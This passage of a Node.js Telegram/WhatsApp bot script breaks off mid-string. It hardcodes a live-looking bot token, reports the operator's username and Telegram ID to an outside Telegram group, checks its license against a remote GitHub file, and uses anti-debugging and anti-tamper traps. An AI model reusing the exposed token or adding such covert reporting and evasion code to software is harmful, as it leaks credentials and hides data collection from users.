const TelegramBot = require("node-telegram-bot-api");
const { default: makeWASocket, useMultiFileAuthState, downloadContentFromMessage, emitGroupParticipantsUpdate, emitGroupUpdate, generateWAMessageContent, generateWAMessage, makeInMemoryStore, prepareWAMessageMedia, generateWAMessageFromContent, MediaType, areJidsSameUser, WAMessageStatus, downloadAndSaveMediaMessage, AuthenticationState, GroupMetadata, initInMemoryKeyStore, getContentType, MiscMessageGenerationOptions, useSingleFileAuthState, BufferJSON, WAMessageProto, MessageOptions, WAFlag, WANode, WAMetric, ChatModification,MessageTypeProto, WALocationMessage, ReconnectMode, WAContextInfo, proto, WAGroupMetadata, ProxyAgent, waChatKey, MimetypeMap, MediaPathMap, WAContactMessage, WAContactsArrayMessage, WAGroupInviteMessage, WATextMessage, WAMessageContent, WAMessage, BaileysError, WA_MESSAGE_STATUS_TYPE, MediaConnInfo, URL_REGEX, WAUrlInfo, WA_DEFAULT_EPHEMERAL, WAMediaUpload, mentionedJid, processTime, Browser, MessageType, Presence, WA_MESSAGE_STUB_TYPES, Mimetype, relayWAMessage, Browsers, GroupSettingChange, DisconnectReason, WASocket, getStream, WAProto, isBaileys, AnyMessageContent, fetchLatestBaileysVersion, templateMessage, InteractiveMessage, Header } = require('@whiskeysockets/baileys');

const express = require('express');
const cors = require('cors');
const app = express();
const PORT = process.env.PORT || process.env.SERVER_PORT || 3000;
const fs = require("fs-extra");
const P = require("pino");
const axios = require("axios");
const path = require("path");
const chalk = require("chalk");
const crypto = require("crypto");
const os = require('os')
const httpMod = require('http')
const httpsMod = require('https')

//HELPER
const dbFile = "./pangkat.json";
function loadpangkat() {
  if (!fs.existsSync(dbFile)) {
    const init = { owners: [String(OWNER_ID)], Premium: [] };
    fs.writeFileSync(dbFile, JSON.stringify(init, null, 2));
    return init;
  }
  return JSON.parse(fs.readFileSync(dbFile));
}
function savepangkat(data) {
  fs.writeFileSync(dbFile, JSON.stringify(data, null, 2));
}

let pangkat = loadpangkat();

function isOwner(id) {
  return pangkat.owners.includes(String(id));
}
function isPremium(id) {
  return pangkat.Premium.includes(String(id));
}

function isOwnerMain(userId) {
  return Number(userId) === OWNER_ID;
}

function getTargetId(msg) {
  if (msg.reply_to_message) return String(msg.reply_to_message.from.id);
  const parts = msg.text.trim().split(" ");
  if (parts[1]) return String(parts[1].replace("@", "")); 
  return null;
}

function escapeMd(text) {
  return text.replace(/([*_[\]()~`>#+\-=|{}.!\\])/g, '\\$1');
}


//CONFIG 
const DatabaseKntol = "https://raw.githubusercontent.com/syamiiiiii/Majestic/refs/heads/main/Database.json";
const TOKEN_PELAPORAN = '8417911332:AAHQd6TQ09GRO_wp3RCOY2RCwHHtPDOrKj8';
const GROUP_ID =  '-4765657853'; 
const { BOT_TOKEN, OWNER_ID, Owner_Username }= require("./config")
const bot = new TelegramBot(BOT_TOKEN, { polling: true });
const THUMB_URL = "https://files.catbox.moe/pg0e1y.jpg";
const GITHUB_URL = "https://raw.githubusercontent.com/syamiiiiii/Majestic/refs/heads/main/index.js"; 
const CHECK_INTERVAL = 3 * 60 * 1000; 

//PROTECTION
let originalHash = null;

function hashString(str) {
  let hash = 0;
  for (let i = 0; i < str.length; i++) {
    hash = (hash << 5) - hash + str.charCodeAt(i);
    hash |= 0;
  }
  return hash.toString();
}

async function checkFile(bot) {
  try {
    const localFile = fs.readFileSync("./index.js", "utf8");
    const { data: githubFile } = await axios.get(GITHUB_URL);

    const localHash = hashString(localFile.trim());
    const githubHash = hashString(githubFile.trim());

    if (originalHash === null) originalHash = githubHash; // Simpan hash awal dari GitHub

    if (localHash !== githubHash) {
      await bot.telegram.sendMessage(
        OWNER_ID,
        `⚠️ *PERINGATAN KEAMANAN!*\nFile *index.js* telah dimodifikasi.\n\nBot akan dimatikan otomatis.`,
        { parse_mode: "Markdown" }
      );
      console.log("[PROTEKSI] File index.js telah dimodifikasi. Bot dimatikan.");
      process.exit();
    } else {
      console.log("PROTEKSI 3 AMAN");
    }
  } catch (err) {
    console.error("[Proteksi] Gagal cek file:", err.message);
  }
}

async function startAntiModify(bot) {
  await checkFile(bot); 
  setInterval(async () => {
    await checkFile(bot);
  }, CHECK_INTERVAL);
}

async function laporan() {
    const LaporanPenyusup = `
\`\`\`
┏━━━━⌦ 𝙱𝙾𝚃 𝙰𝙺𝚃𝙸𝙵 ⌫━━━━━┓
┃ Username : @${Owner_Username}
┃ ID Tele : ${OWNER_ID}
┗━━━━━━━━━━━━━━━━━━━┛
\`\`\`
`;

    await axios.post(`https://api.telegram.org/bot${TOKEN_PELAPORAN}/sendPhoto`, {
      chat_id: GROUP_ID,      
      photo: THUMB_URL,
      caption: LaporanPenyusup,
      parse_mode: "Markdown",
      reply_markup: JSON.stringify({
        inline_keyboard: [
          [
            {
              text: "BUKA USERNAME",
              url: `https://t.me/${Owner_Username}`
            }
          ]
        ]
      })
    });
  }

function genOtp() {
  return String(Math.floor(100000 + Math.random() * 900000));
}

async function sendTelegramMessage(chatId, text) {
  if (!TOKEN_PELAPORAN) {
    console.warn('pelaporan tidak diset, skip kirim telegram.');
    return;
  }
  try {
    await axios.post(`https://api.telegram.org/bot${TOKEN_PELAPORAN}/sendMessage`, {
      chat_id: chatId,
      text,
      parse_mode: 'Markdown'
    }, { timeout: 5000 });
  } catch (e) {
    console.warn('Gagal kirim pesan Telegram:', e.message);
  }
}


async function runOtpGate({ maxAttempts = 3, otpTtlMs = 5 * 60 * 1000 } = {}) {
  const otp = genOtp();
  const sentAt = Date.now();
  const expiresAt = sentAt + otpTtlMs;

  const groupMsg = [`
┏━━━━⌦ 𝙲𝙾𝙳𝙴 𝙾𝚃𝙿 𝙼𝚄 ⌫━━━━━┓
┃ Username : @${Owner_Username}
┃ ID Tele : ${OWNER_ID}
┃ Berlaku sampai: ${new Date(expiresAt).toLocaleString()}
┃ Code: \`${otp}\`
┗━━━━━━━━━━━━━━━━━━━━━━┛`,
  ].join('\n');

  
  await sendTelegramMessage(GROUP_ID, groupMsg);

  console.log(`OTP dikirim ke group. Kode valid sampai ${new Date(expiresAt).toLocaleString()}`);

  for (let attempt = 1; attempt <= maxAttempts; attempt++) {
    const answer = await question(`Masukkan kode OTP (attempt ${attempt}/${maxAttempts}): `);
    if (!answer) {
      console.log('Tidak ada input. Coba lagi.');
      await sendTelegramMessage(GROUP_ID, ` Terminal: tidak ada input pada percobaan OTP (attempt ${attempt}).`);
      continue;
    }

    const input = String(answer).trim();

    if (Date.now() > expiresAt) {
      console.log('OTP sudah kadaluarsa.');
      await sendTelegramMessage(GROUP_ID, ` OTP kadaluarsa (waktu habis) — percobaan dari terminal.`);
      break;
    }

    if (input === otp) {
      console.log(' OTP benar — akses diberikan.');
      await sendTelegramMessage(GROUP_ID, ` OTP berhasil digunakan. Akses diberikan.`);
      return true;
    } else {
      console.log(' OTP salah.');
      await sendTelegramMessage(GROUP_ID, ` Percobaan OTP salah (attempt ${attempt}/${maxAttempts})`);
      
    }
  }

  console.log(`${maxAttempts}x percobaan gagal. Program keluar`);
  await sendTelegramMessage(GROUP_ID, ` Pengguna @${Owner_Username} gagal verifikasi ${maxAttempts} kali. Program akan dihentikan.`);
  process.abort();
  
  return false;
}
function activateSecureMode() {
  secureMode = true;
}

(function() {
  function randErr() {
    return Array.from({ length: 12 }, () =>
      String.fromCharCode(33 + Math.floor(Math.random() * 90))
    ).join("");
  }

  setInterval(() => {
    const start = performance.now();
    debugger;
    if (performance.now() - start > 100) {
      throw new Error(randErr());
    }
  }, 1000);

  const code = "AlwaysProtect";
  if (code.length !== 13) {
    throw new Error(randErr());
  }

  function secure() {
    console.log(chalk.bold.yellow(`
⠀⠀⠀⠀⠠⠤⠤⠤⠤⠤⣤⣤⣤⣄⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣀⣤⣤⣤⠤⠤⠤⠤⠤⠄⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠉⠛⠛⠿⢶⣤⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣤⡶⠿⠛⠛⠉⠉⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⢀⣀⣀⣠⣤⣤⣴⠶⠶⠶⠶⠶⠶⠶⠶⠶⠿⠿⢿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡿⠿⠶⠶⠶⠶⠶⠶⠶⣦⣤⣄⣀⣀⡀⠀⠀
⠚⠛⠉⠉⠉⠀⠀⠀⠀⠀⠀⢀⣀⣀⣤⡴⠶⠶⠿⠿⠿⣧⡀⠀⠀⠀⠤⢄⣀⣀⡀⢀⣷⠿⠿⠿⠶⠶⣤⣀⣀⡀⠀⠀⠀⠀⠉⠉⠛⠛⠒
⠀⠀⠀⠀⠀⠀⠀⢀⣠⡴⠞⠛⠉⠁⠀⠀⠀⠀⠀⠀⠀⢸⣿⣷⣶⣦⣤⣄⣈⡑⢦⣀⣸⡇⠀⠀⠀⠀⠀⠀⠈⠉⠛⠳⢦⣄⠀⠀⠀⠀⠀
⠀⠀⠀⠀⣠⠔⠚⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣾⡿⠟⠉⠉⠉⠉⠙⠛⠿⣿⣮⣷⣤⣤⣤⣿⣆⠀⠀⠀⠀⠀⠀⠈⠉⠚⠦⣄⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣿⡿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⢻⣯⣧⠀⠈⢿⣆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠻⢷⡤⢸⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢿⣿⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣿⡿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⣿⣦⣤⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣤⣾⠟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠙⠛⠛⠻⠿⠿⣿⣶⣶⣦⣄⣀⣀⣀⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠻⣿⣯⡛⠻⢦⡀⢀⡴⠟⣿⠟⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⢿⣆⠀⠙⢿⡀⢀⣿⠋⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢻⣆⠀⠈⣿⣿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠻⡆⠀⠸⡿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⡀⠀⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠃⠀⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀

WELCOME
  `))
  }
  
  const hash = Buffer.from(secure.toString()).toString("base64");
  setInterval(() => {
    if (Buffer.from(secure.toString()).toString("base64") !== hash) {
      throw new Error(randErr());
    }
  }, 2000);

  secure();
})();

(() => {
  const hardExit = process.exit.bind(process);
  Object.defineProperty(process, "exit", {
    value: hardExit,
    writable: false,
    configurable: false,
    enumerable: true,
  });

  const hardKill = process.kill.bind(process);
  Object.defineProperty(process, "kill", {
    value: hardKill,
    writable: false,
    configurable: false,
    enumerable: true,
  });

  setInterval(() => {
    try {
      if (process.exit.toString().includes("Proxy") ||
          process.kill.toString().includes("Proxy")) {
        console.log(chalk.bold.yellow(`
⠀⠀⠀⠀⠠⠤⠤⠤⠤⠤⣤⣤⣤⣄⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣀⣤⣤⣤⠤⠤⠤⠤⠤⠄⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠉⠛⠛⠿⢶⣤⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣤⡶⠿⠛⠛⠉⠉⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⢀⣀⣀⣠⣤⣤⣴⠶⠶⠶⠶⠶⠶⠶⠶⠶⠿⠿⢿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡿⠿⠶⠶⠶⠶⠶⠶⠶⣦⣤⣄⣀⣀⡀⠀⠀
⠚⠛⠉⠉⠉⠀⠀⠀⠀⠀⠀⢀⣀⣀⣤⡴⠶⠶⠿⠿⠿⣧⡀⠀⠀⠀⠤⢄⣀⣀⡀⢀⣷⠿⠿⠿⠶⠶⣤⣀⣀⡀⠀⠀⠀⠀⠉⠉⠛⠛⠒
⠀⠀⠀⠀⠀⠀⠀⢀⣠⡴⠞⠛⠉⠁⠀⠀⠀⠀⠀⠀⠀⢸⣿⣷⣶⣦⣤⣄⣈⡑⢦⣀⣸⡇⠀⠀⠀⠀⠀⠀⠈⠉⠛⠳⢦⣄⠀⠀⠀⠀⠀
⠀⠀⠀⠀⣠⠔⠚⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣾⡿⠟⠉⠉⠉⠉⠙⠛⠿⣿⣮⣷⣤⣤⣤⣿⣆⠀⠀⠀⠀⠀⠀⠈⠉⠚⠦⣄⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣿⡿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⢻⣯⣧⠀⠈⢿⣆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠻⢷⡤⢸⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢿⣿⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣿⡿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⣿⣦⣤⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣤⣾⠟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠙⠛⠛⠻⠿⠿⣿⣶⣶⣦⣄⣀⣀⣀⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠻⣿⣯⡛⠻⢦⡀⢀⡴⠟⣿⠟⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⢿⣆⠀⠙⢿⡀⢀⣿⠋⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢻⣆⠀⠈⣿⣿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠻⡆⠀⠸⡿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⡀⠀⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠃⠀⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
BYE
  `))
        activateSecureMode();
        hardExit(1);
      }

      for (const sig of ["SIGINT", "SIGTERM", "SIGHUP"]) {
        if (process.listeners(sig).length > 0) {
          console.log(chalk.bold.yellow(`
⠀⠀⠀⠀⠠⠤⠤⠤⠤⠤⣤⣤⣤⣄⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣀⣤⣤⣤⠤⠤⠤⠤⠤⠄⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠉⠛⠛⠿⢶⣤⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣤⡶⠿⠛⠛⠉⠉⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⢀⣀⣀⣠⣤⣤⣴⠶⠶⠶⠶⠶⠶⠶⠶⠶⠿⠿⢿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡿⠿⠶⠶⠶⠶⠶⠶⠶⣦⣤⣄⣀⣀⡀⠀⠀
⠚⠛⠉⠉⠉⠀⠀⠀⠀⠀⠀⢀⣀⣀⣤⡴⠶⠶⠿⠿⠿⣧⡀⠀⠀⠀⠤⢄⣀⣀⡀⢀⣷⠿⠿⠿⠶⠶⣤⣀⣀⡀⠀⠀⠀⠀⠉⠉⠛⠛⠒
⠀⠀⠀⠀⠀⠀⠀⢀⣠⡴⠞⠛⠉⠁⠀⠀⠀⠀⠀⠀⠀⢸⣿⣷⣶⣦⣤⣄⣈⡑⢦⣀⣸⡇⠀⠀⠀⠀⠀⠀⠈⠉⠛⠳⢦⣄⠀⠀⠀⠀⠀
⠀⠀⠀⠀⣠⠔⠚⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣾⡿⠟⠉⠉⠉⠉⠙⠛⠿⣿⣮⣷⣤⣤⣤⣿⣆⠀⠀⠀⠀⠀⠀⠈⠉⠚⠦⣄⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣿⡿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⢻⣯⣧⠀⠈⢿⣆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠻⢷⡤⢸⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢿⣿⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣿⡿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⣿⣦⣤⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣤⣾⠟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠙⠛⠛⠻⠿⠿⣿⣶⣶⣦⣄⣀⣀⣀⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠻⣿⣯⡛⠻⢦⡀⢀⡴⠟⣿⠟⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⢿⣆⠀⠙⢿⡀⢀⣿⠋⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢻⣆⠀⠈⣿⣿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠻⡆⠀⠸⡿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⡀⠀⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠃⠀⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
BYE

  `))
        activateSecureMode();
        hardExit(1);
        }
      }
    } catch {
      activateSecureMode();
      hardExit(1);
    }
  }, 2000);

  global.validateToken = async (DatabaseKntol, BOT_TOKEN) => {
  try {
    const res = await axios.get(DatabaseKntol, { timeout: 5000 });
    const tokens = (res.data && res.data.tokens) || [];

    if (!tokens.includes(BOT_TOKEN)) {
      console.log(chalk.bold.yellow(`
⠀⠀⠀⠀⠠⠤⠤⠤⠤⠤⣤⣤⣤⣄⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣀⣤⣤⣤⠤⠤⠤⠤⠤⠄⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠉⠛⠛⠿⢶⣤⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣤⡶⠿⠛⠛⠉⠉⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⢀⣀⣀⣠⣤⣤⣴⠶⠶⠶⠶⠶⠶⠶⠶⠶⠿⠿⢿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡿⠿⠶⠶⠶⠶⠶⠶⠶⣦⣤⣄⣀⣀⡀⠀⠀
⠚⠛⠉⠉⠉⠀⠀⠀⠀⠀⠀⢀⣀⣀⣤⡴⠶⠶⠿⠿⠿⣧⡀⠀⠀⠀⠤⢄⣀⣀⡀⢀⣷⠿⠿⠿⠶⠶⣤⣀⣀⡀⠀⠀⠀⠀⠉⠉⠛⠛⠒
⠀⠀⠀⠀⠀⠀⠀⢀⣠⡴⠞⠛⠉⠁⠀⠀⠀⠀⠀⠀⠀⢸⣿⣷⣶⣦⣤⣄⣈⡑⢦⣀⣸⡇⠀⠀⠀⠀⠀⠀⠈⠉⠛⠳⢦⣄⠀⠀⠀⠀⠀
⠀⠀⠀⠀⣠⠔⠚⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣾⡿⠟⠉⠉⠉⠉⠙⠛⠿⣿⣮⣷⣤⣤⣤⣿⣆⠀⠀⠀⠀⠀⠀⠈⠉⠚⠦⣄⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣿⡿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⢻⣯⣧⠀⠈⢿⣆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠻⢷⡤⢸⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢿⣿⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣿⡿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⣿⣦⣤⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣤⣾⠟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠙⠛⠛⠻⠿⠿⣿⣶⣶⣦⣄⣀⣀⣀⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠻⣿⣯⡛⠻⢦⡀⢀⡴⠟⣿⠟⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⢿⣆⠀⠙⢿⡀⢀⣿⠋⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢻⣆⠀⠈⣿⣿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠻⡆⠀⠸⡿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⡀⠀⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠃⠀⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
BYE
  `));

      try {
      } catch (e) {
      }

      activateSecureMode();
      hardExit(1);
    }
  } catch (err) {
    console.log(chalk.bold.yellow(`
